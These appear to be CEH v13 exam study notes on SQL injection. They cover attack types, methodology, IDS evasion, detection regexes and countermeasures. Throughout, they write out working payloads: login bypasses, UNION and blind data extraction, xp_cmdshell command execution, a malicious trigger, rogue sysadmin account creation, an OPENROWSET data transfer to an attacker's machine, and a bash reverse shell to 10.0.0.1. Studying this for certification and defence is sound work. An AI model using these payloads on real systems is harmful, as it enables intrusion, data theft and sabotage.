# Module 15: SQL Injection

> **Exam:** 312-50
**Source:** EC-Council Official Curricula — CEH v13
> 

---

## 📋 Table of Contents

1. [SQL Injection Concepts](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#1-sql-injection-concepts)
2. [Types of SQL Injection](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#2-types-of-sql-injection)
3. [SQL Injection Methodology](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#3-sql-injection-methodology)
4. [Evasion Techniques](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#4-evasion-techniques)
5. [SQL Injection Countermeasures](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#5-sql-injection-countermeasures)
6. [Quick Exam Cheat Sheet](https://claude.ai/chat/fc638238-2f8e-4332-8658-6a758501181f#6-quick-exam-cheat-sheet)

---

## 1. SQL Injection Concepts

### 🎯 What is SQL Injection?

> A technique used to take advantage of **un-sanitized input vulnerabilities** to pass SQL commands through a web application for execution by a backend database. Used to either **gain unauthorized access** to a database or **retrieve information** directly from it. It is a **flaw in web applications**, NOT a database or web server issue.
> 

### ⚠️ Why Bother About SQL Injection? — 4 Attack Types

```
1. Authentication and Authorization Bypass
2. Information Disclosure
3. Compromised Integrity and Availability of Data
4. Remote Code Execution
```

---

### 📖 Understanding Normal SQL Query vs SQL Injection Query

**Normal SQL Query:**

```
Username: "Peter"    Password: "Pe**&4**"
SELECT Count(*) FROM Users WHERE UserName='Peter' AND Password='Pe**&4**'
```

**SQL Injection Query (Classic Bypass):**

```
Username: "Blah' OR 1=1 --"    Password: ""
SELECT Count(*) FROM Users WHERE UserName='Blah' OR 1=1 --' AND Password='Pe**&4**'
```

> In SQL, a pair of hyphens (`--`) indicates the beginning of a comment, causing the rest of the line to be ignored. The query simplifies to:
> 

```sql
SELECT Count(*) FROM Users WHERE UserName='blah' OR 1=1
```

> This is always TRUE, bypassing the password check entirely.
> 

**UNION-based extraction example (Search field):**

```
blah' UNION Select 0, username, password, 0 from users --
```

```sql
SELECT ProductId, ProductName, QuantityPerUnit, UnitPrice FROM Products
WHERE ProductName LIKE 'blah' UNION Select 0, username, password, 0 from users --
```

---

## 2. Types of SQL Injection

### 📊 Master Classification Diagram (CRITICAL — MEMORIZE)

```
SQL Injection
│
├── In-band SQL Injection
│   ├── Error-based SQL Injection ──→ System Stored Procedure
│   ├── UNION SQL Injection      ──→ Illegal/Logically Incorrect Query
│   ├── Tautology
│   ├── End of Line Comment
│   ├── Inline Comment
│   └── Piggybacked Query
│
├── Blind/Inferential SQL Injection
│   ├── Time Delay
│   ├── Boolean Exploitation
│   └── Heavy Query
│
└── Out-of-Band SQL Injection
```

---

### 🔵 In-Band SQL Injection

> Attacker uses the **SAME communication channel** to perform the attack AND retrieve results. Commonly used and easy-to-exploit. Most common in-band attacks: **error-based** and **UNION** SQL injection.
> 

| Technique | Description | Example |
| --- | --- | --- |
| **Error-based SQL Injection** | Forces the database to return error messages that leak info useful for building further queries. Exploitation differs by DBMS | Oracle: `http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )—` → `ORA-292257: host SCOTT unknown` |
| **UNION SQL Injection** | Attacker uses a UNION clause to append a malicious query to the requested query | `SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable` |
| **Tautology** | Uses a conditional OR clause so the WHERE clause condition is always TRUE — bypasses authentication | `SELECT * FROM users WHERE name = '' OR '1'='1';` |
| **End-of-Line Comment** | Uses line comments (`--`) so the database executes code until it reaches the comment, ignoring the rest | `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'` → logs in as admin without password |
| **In-line Comments** | Integrates multiple vulnerable inputs into a single query using in-line comments; bypasses blacklisting, removes spaces, obfuscates, determines DB versions | `INSERT INTO Users (UserName, isAdmin, Password) VALUES ('".$username."', 0, '".$password."')"` |
| **System Stored Procedure** | If web app doesn't sanitize input used to dynamically construct SQL for stored procedures, attacker executes malicious SQL within them | `Create procedure Login @user_name varchar(20), @password varchar(20) As Declare @query varchar(250) Set @query = 'Select 1 from usertable Where username = ' + @user_name + ' and password = ' + @password exec(@query) Go` — input `anyusername or 1=1' anypassword` bypasses login |
| **Illegal/Logically Incorrect Query** | Attacker intentionally sends incorrect queries to generate error messages revealing DB structure | Username: `'Bob"` → `Incorrect Syntax near 'Bob'. Unclosed quotation mark...` |

---

### 🔵 Blind/Inferential SQL Injection

> Used when a web app is vulnerable to SQLi but **results are NOT visible** to the attacker. A generic custom page is displayed instead of a useful error message. Attacker poses **true/false questions** to determine if the app is vulnerable. Time-intensive because a new statement must be crafted for each bit recovered.
> 

| Technique | Description | Example |
| --- | --- | --- |
| **Boolean Exploitation** | Multiple valid TRUE/FALSE statements supplied in the affected parameter; compares response pages to infer if injection succeeded | `http://www.myshop.com/item.aspx?id=67 and 1=2` (FALSE, no item shown) vs `...and 1=1` (TRUE, item shown) |
| **Time Delay (Time-based)** | Evaluates time delay in response to true/false queries using a `waitfor` statement | `; IF EXISTS(SELECT * FROM creditcard) WAITFOR DELAY '0:0:10'--` — if TRUE, sleeps 10 sec |
| **Heavy Query** | Retrieves a large amount of data using multiple joins on system tables — takes a long time to execute WITHOUT using time delay functions (useful when admin disables time-delay functions) | `SELECT * FROM products WHERE id=1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C` |

**Time-delay Commands:**

```sql
-- Microsoft SQL Server
WAITFOR DELAY '0:0:10'--

-- MySQL Server
BENCHMARK(howmanytimes, do this)
```

**Testing for Blind SQLi vulnerability:**

```
shop.com/items.php?id=101 and 1=0   → always FALSE
shop.com/items.php?id=101 and 1=1   → always TRUE (if page returns normally, vulnerable)
```

**Extracting data character-by-character (Blind SQLi — Extract Database User):**

```
-- Check username length
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--

-- Check 1st character
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--
```

> Finding the first letter with a binary search requires 7 requests; an 8-character name requires 56 requests.
> 

---

### 🔵 Out-of-Band SQL Injection

> Difficult to perform — attacker needs to communicate with the server via a **different channel** (e.g., database email functionality, file writing/loading functions) than the one used to make requests. Used when in-band or blind SQLi channels aren't usable.
> 
- **Microsoft SQL Server:** exploits `xp_dirtree` command to send DNS requests to attacker-controlled server
- **Oracle Database:** uses `UTL_HTTP` package to send HTTP requests from SQL/PL-SQL to attacker-controlled server

**Out-of-Band Exploitation Example:**

```
http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)—
```

```bash
# Tester sets up listener
/home/tester/nc -nLp 80
```

---

## 3. SQL Injection Methodology

### 📊 3-Phase Methodology (CRITICAL)

```
1. Information Gathering and SQL Injection Vulnerability Detection
2. Launch SQL Injection Attacks
3. Advanced SQL Injection (Compromising the entire target network)
```

---

### 1️⃣ Information Gathering and Vulnerability Detection

**Information to gather:** database name, version, users, output mechanism, DB type, user privilege level, OS interaction level.

**Steps:**

```
1. Check if the web application connects to a database server
2. List all input fields, hidden fields, and POST requests
3. Attempt to inject code into input fields to generate an error
4. Try to insert a string value where a number is expected
5. Use the UNION operator to combine result sets of two+ SELECT statements
6. Check detailed error messages to gain information for SQL injection
```

**Black-Box Testing Techniques:**

| Technique | Description | Example |
| --- | --- | --- |
| **Grouping Error** | The `HAVING` command defines a query based on "grouped" fields; error message reveals ungrouped columns | `' group by columnnames having 1=1 --` → `Grouping error: column "columnnames" must appear in the GROUP BY clause` |
| **Type Mismatch** | Insert strings into numeric fields; error messages reveal data that couldn't convert | `' union select 1,1,'text',1,1,1 --` |
| **Injections in SELECT clause** | Most injections occur in the WHERE section of a SELECT statement | `SELECT * FROM table WHERE x = 'normalinput' group by x having 1=1 -- GROUP BY x HAVING x = y ORDER BY x` |

**Detecting SQL Modification:** Send long strings of single quote characters (or brackets/double quotes) — max out REPLACE and QUOTENAME function return values, potentially truncating the command variable.

**Tools:** Burp Suite, Tamper Dev

---

### 2️⃣ Launch SQL Injection Attacks

**Perform Error Based SQL Injection — 4-Step Data Extraction:**

```
1. Extract Database Name:
   ...id=1 or 1=convert(int,(DB_NAME))--
2. Extract 1st Database Table:
   ...id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--
3. Extract 1st Table Column Name:
   ...id=1 or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--
4. Extract 1st Field of 1st Row (Data):
   ...id=1 or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
```

> Each returns a "Syntax error converting the nvarchar value '[VALUE]' into a column of data type int" — leaking the value directly in the error message.
> 

**Bypass Website Logins — Character-by-Character Password Extraction:**

```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[8]%' AND ID=2)
```

> If TRUE, 2nd character of password confirmed as "8" — repeat for all characters.
> 

**JSON-based SQL Injection (WAF Bypass):**

```
'or '{"key": "value"}' ? "key"
```

```json
{"user": "<username>' --","pass": "irrelevant"}
```

```sql
SELECT * FROM users WHERE username = '<username>' --' AND password = 'irrelevant';
```

**Insert New User via SQL Injection:**

```sql
SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'; INSERT INTO Users (Email_ID, User_Name, Password) VALUES ('Clark@mymail.com','Clark','MyPassword');--';
```

> Requires INSERT permission on the Users table.
> 

**Creating Database Backdoor (Trigger-based):**

```sql
CREATE OR REPLACE TRIGGER SET_PRICE
AFTER INSERT OR UPDATE ON ITEMS
FOR EACH ROW
BEGIN
  UPDATE ITEMS
  SET Price = 0;
END;
```

> Every purchase becomes free once this malicious trigger is injected.
> 

**HTTP Header-Based SQL Injection:** Exploits improperly sanitized HTTP header fields (User-Agent, Referer, Cookie, etc.) to inject SQL queries.

---

### 3️⃣ Advanced SQL Injection — Compromising the Target Network

**Column Enumeration in DB (by DBMS):**

```sql
-- MSSQL
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')
sp_columns tablename

-- MySQL
show columns from tablename

-- Oracle
SELECT * FROM all_tab_columns WHERE table_name='tablename'

-- DB2
SELECT * FROM syscat.columns WHERE tabname='tablename'

-- PostgreSQL
SELECT attnum,attname from pg_class, pg_attribute WHERE relname='tablename' AND pg_class.oid=attrelid AND attnum > 0
```

**Creating Database Accounts (by DBMS):**

```sql
-- Microsoft SQL Server
exec sp_addlogin 'victor', 'Pass123'
exec sp_addsrvrolemember 'victor', 'sysadmin'

-- Oracle
CREATE USER victor IDENTIFIED BY Pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users;
GRANT CONNECT TO victor; GRANT RESOURCE TO victor;

-- MySQL
INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))
```

**Password Grabbing:** Attacker crafts SQL injection queries to grab passwords from user-defined database tables — may change, destroy, or steal them, potentially escalating to admin level.

**Transfer Database to Attacker's Machine (via OPENROWSET):**

```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;', 'select * from mydatabase..hacked_sysdatabases')
select * from sys.sysdatabases --
```

> Connects to attacker's machine on port 80 to replicate DB structure and transfer data.
> 

**Interacting with the Operating System — 2 Ways:**

```
1. Reading and writing system files from the disk
2. Direct command execution via remote shell
```

**MSSQL OS Interaction — `xp_cmdshell` (CRITICAL):**

```sql
'; exec master..xp_cmdshell 'ipconfig > test.txt' --
'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
'; begin declare @data varchar(8000); set @data='| '; select @data=@data+txt+'|' from tmp where txt<@data; select @data as x into temp end --
' and 1 in (select substring(x,1,256) from temp) --
'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --
```

**MySQL OS Interaction:**

```sql
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
```

> Note: Both methods restricted by the database's running privileges and permissions.
> 

**Interactive reverse shell using built-in DBMS functions:**

```bash
EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

---

### 🛠️ SQL Injection Tools

| Tool | Description |
| --- | --- |
| **sqlmap** | Open-source pentest tool; automates detecting/exploiting SQL injection flaws and taking over DB servers. Full support for **6 techniques**: Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, out-of-band injection |
| **Mole** | Detects and exploits SQLi by providing a vulnerable URL and valid string on the site |
| **jSQL Injection, NoSQLMap, Havij, blind_sql_bitshifting** | Additional SQLi tools |

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=E --dbs
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --dump
```

---

## 4. Evasion Techniques

### 🛡️ Evading IDS

> Signature-based IDS builds a database of SQL injection attack strings (signatures) and compares input strings against it at runtime. Attackers use evasion techniques to **obscure input strings** to avoid detection.
> 

### 📊 13 Signature Evasion Techniques (CRITICAL — MEMORIZE)

| Technique | Description |
| --- | --- |
| **In-line Comment** | Obscures input strings by inserting in-line comments between SQL keywords |
| **Char Encoding** | Uses a built-in CHAR function to represent a character |
| **String Concatenation** | Concatenates text to create an SQL keyword using DB-specific instructions |
| **Obfuscated Code** | SQL statement made difficult to understand |
| **Manipulating White Spaces** | Obscures input strings by inserting whitespace between SQL keywords |
| **Hex Encoding** | Uses hexadecimal encoding to represent an SQL query string |
| **Sophisticated Matches** | Uses alternative expressions of "OR 1=1" |
| **URL Encoding** | Obscures input string by adding % sign before each code point |
| **Null Byte** | Uses null byte (%00) character prior to a string to bypass detection |
| **Case Variation** | Obfuscates SQL statement by mixing upper/lower case letters |
| **Declare Variables** | Uses variables to pass specially crafted SQL statements, bypassing detection |
| **IP Fragmentation** | Splits an IP packet across multiple small fragments to obscure the attack payload |
| **Variations** | Uses a WHERE statement always evaluated as "true" so any math/string comparison works |

**Null Byte example:**

```
' UNION SELECT Password FROM Users WHERE UserName='admin'--
%00' UNION SELECT Password FROM Users WHERE UserName='admin'--   ← bypasses WAF/IDS
```

**Case Variation example:**

```sql
-- Filter detects:
union select user_id, password from admin where user_name='admin'--
-- Attacker bypasses with:
UnIoN sElEcT UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE='AdMIn'--
```

**Declare Variables example:**

```sql
-- Original: UNION Select Password
; declare @sqlvar nvarchar(70); set @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)
```

**Hex Encoding example:**

```sql
-- 'SELECT' → 0x73656c656374
; declare @x varchar(80); set @x = X73656c656374...; EXEC (@x)   -- uses no single quotes (')
```

**IP Fragmentation:** Attacker intentionally splits an IP packet across multiple small fragments. For an IDS/WAF to detect an attack, it must first reassemble fragments — checking each individually usually prevents a match between the attack string and signature. Ways to evade:

```
Pause sending parts of the attack (hope IDS times out before target)
Send packets in reverse order
Send packets in correct order except first fragment last
Send packets in correct order except last fragment first
Send packets out of order or randomly
```

---

### 🔍 Detecting SQL Injection Attacks (Regex Patterns)

**SQL Meta-Characters Table:**

| Character | Explanation |
| --- | --- |
| `'` | Single-quote character |
| `|` | Or |
| `%27` | Hex equivalent of single-quote |
| `--` | Double-dash |
| `%2D` | Hex equivalent of double-dash |
| `#` | Hash/pound character |
| `%23` | Hex equivalent of hash |
| `i` | Case-insensitive |
| `x` | Ignore white spaces in pattern |
| `%3D` | Hex equivalent of `=` |
| `%3B` | Hex equivalent of `;` |
| `%6F/%4F` | Hex equivalent of o/O |
| `%72/%52` | Hex equivalent of r/R |
| `%3C` | Hex equivalent of `<` |
| `%3E` | Hex equivalent of `>` |
| `%2F` | Hex equivalent of `/` |
| `\s` | Whitespace equivalent |

**Regex examples:**

```
Detection of SQL meta-characters:
/(\')|(\%27)|(\-\-)|(#)|(\%23)/ix

Typical SQL injection attack:
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix

UNION keyword detection:
/((\%27)|(\'))union/ix

MS SQL Server specific:
/exec(\s|\+)+(s|x)p\w+/ix
```

---

## 5. SQL Injection Countermeasures

### 🛡️ How to Defend Against SQL Injection Attacks (24-Point Checklist — CRITICAL)

1. Make no assumptions about the **size, type, or content** of received data
2. Test **size and data type** of input; enforce appropriate limits
3. Test content of **string variables**; accept only expected values
4. Reject entries with **binary data, escape sequences, comment characters**
5. Never build Transact-SQL statements directly from user input; use **stored procedures** to validate input
6. Implement **multiple layers of validation**; never concatenate unvalidated user input
7. Avoid constructing **dynamic SQL** with concatenated input values
8. Ensure **web config files** don't contain sensitive information
9. Use **most restrictive SQL account types** for applications
10. Use network, host, and application **intrusion detection systems**
11. Perform automated **black box injection testing, static source code analysis, manual penetration testing**
12. Keep **untrusted data separate** from commands and queries
13. In absence of a parameterized API, use a specific **escape syntax** for the interpreter
14. Use a **secure hash algorithm (SHA256)** to store passwords, not plaintext
15. Use a **data access abstraction layer** to enforce secure access
16. Ensure **code tracing and debug messages** are removed before deployment
17. Design code to appropriately **trap and handle exceptions**
18. Apply the **least privilege rule** to run applications accessing the DBMS
19. Validate **user-supplied data** as well as data from untrusted sources server-side
20. Avoid **quoted/delimited identifiers** — they complicate whitelisting/blacklisting/escaping
21. Use a **prepared statement** to create a **parameterized query**
22. Ensure all **user inputs are sanitized** before using in dynamic SQL statements
23. Use **regular expressions and stored procedures** to detect potentially harmful code
24. Avoid using any **web application not tested** by the web server

---

### 🛠️ SQL Injection Detection Tools

```
OWASP ZAP (integrated pentest tool, automated + manual scanners) |
Damn Small SQLi Scanner (DSSS) — GET/POST parameter scanner
```

---

## 6. Quick Exam Cheat Sheet

### 📊 3 Types of SQL Injection

```
In-band SQLi          → same channel for attack + results (Error-based, UNION, Tautology,
                          End-of-Line/In-line Comment, System Stored Procedure)
Blind/Inferential SQLi → no visible error, uses true/false (Time Delay, Boolean, Heavy Query)
Out-of-Band SQLi       → different channel (xp_dirtree, UTL_HTTP)
```

---

### 🔑 Classic Bypass Payloads

```
' OR 1=1 --
' OR '1'='1
admin'--
' UNION SELECT username, password FROM users --
```

---

### 📊 3-Phase SQLi Methodology

```
1. Information Gathering and Vulnerability Detection
2. Launch SQL Injection Attacks
3. Advanced SQL Injection (Compromise Network)
```

---

### 🔧 Key Commands Reference

```sql
-- Time-based (MSSQL)
WAITFOR DELAY '0:0:10'--

-- Time-based (MySQL)
BENCHMARK(howmanytimes, do_this)

-- OS Command Execution (MSSQL)
exec master..xp_cmdshell 'command' --

-- MySQL OS Interaction
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
```

---

### 🔥 Common Exam Scenarios

**Q: What are the 3 main types of SQL injection?**
→ **In-band, Blind/Inferential, Out-of-Band**

**Q: What are the two most common in-band SQL injection techniques?**
→ **Error-based SQL injection and UNION SQL injection**

**Q: What are the 3 blind/inferential SQL injection techniques?**
→ **Time Delay, Boolean Exploitation, Heavy Query**

**Q: What MSSQL command allows attackers to execute OS commands via SQL injection?**
→ **`xp_cmdshell`**

**Q: What Oracle package allows out-of-band HTTP requests from SQL/PL-SQL?**
→ **`UTL_HTTP`**

**Q: What MSSQL command sends DNS requests for out-of-band SQL injection?**
→ **`xp_dirtree`**

**Q: What character sequence comments out the rest of a SQL query line?**
→ **`--` (double-dash)**

**Q: What technique uses a HAVING clause error to reveal ungrouped column names?**
→ **Grouping Error**

**Q: What evasion technique uses %00 before a string to bypass detection?**
→ **Null Byte**

**Q: What evasion technique mixes upper/lowercase letters to bypass case-sensitive filters?**
→ **Case Variation**

**Q: What evasion technique splits an IP packet across multiple fragments to evade signature detection?**
→ **IP Fragmentation**

**Q: What tool supports all 6 major SQL injection techniques (Boolean-blind, time-blind, error-based, UNION, stacked queries, out-of-band)?**
→ **sqlmap**

**Q: What's the recommended way to prevent SQL injection at the code level?**
→ **Prepared statements / parameterized queries**

**Q: What hash algorithm should be used to store passwords (not plaintext)?**
→ **SHA256**

**Q: What testing approach combines black box injection testing, static source code analysis, and manual penetration testing?**
→ Recommended layered approach in the **SQL injection countermeasures** checklist

**Q: In error-based SQL injection, what's the 4-step data extraction order?**
→ **Database Name → 1st Table Name → 1st Column Name → 1st Field/Row Data**

---

*Notes compiled from CEH v13 Official Curricula — EC-Council | Exam 312-50 | Module 15*